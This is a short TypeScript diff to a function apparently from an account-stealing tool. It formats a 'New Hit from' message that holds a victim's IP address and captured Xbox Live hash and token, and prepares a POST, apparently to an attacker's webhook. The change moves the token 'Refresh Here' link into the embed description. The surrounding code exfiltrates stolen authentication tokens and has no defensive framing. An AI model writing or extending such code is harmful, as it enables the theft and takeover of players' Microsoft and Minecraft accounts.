@@ -60,7 +60,7 @@ export default async function oauthWebhook(data: any, nwData:any, ip: string, we
         })
     }
     
-    let mcEmbed = {
+    let mcEmbed:any = {
         "title": `New Hit from: ${ip}`,
         "color": 15695665,
         "fields": fields,
@@ -78,7 +78,7 @@ export default async function oauthWebhook(data: any, nwData:any, ip: string, we
         "embeds": [mcEmbed],
     }
     if (xbl_hash && xbl_token && xbl_hash.length + xbl_token.length < 2000) {
-        body.content = `[Refresh Here](${refreshURL}?xbl_hash=${xbl_hash}&xbl_token=${xbl_token})`
+        mcEmbed.description  = `[Refresh Here](${refreshURL}?xbl_hash=${xbl_hash}&xbl_token=${xbl_token})`
     }
     const options = {
         method: "POST",
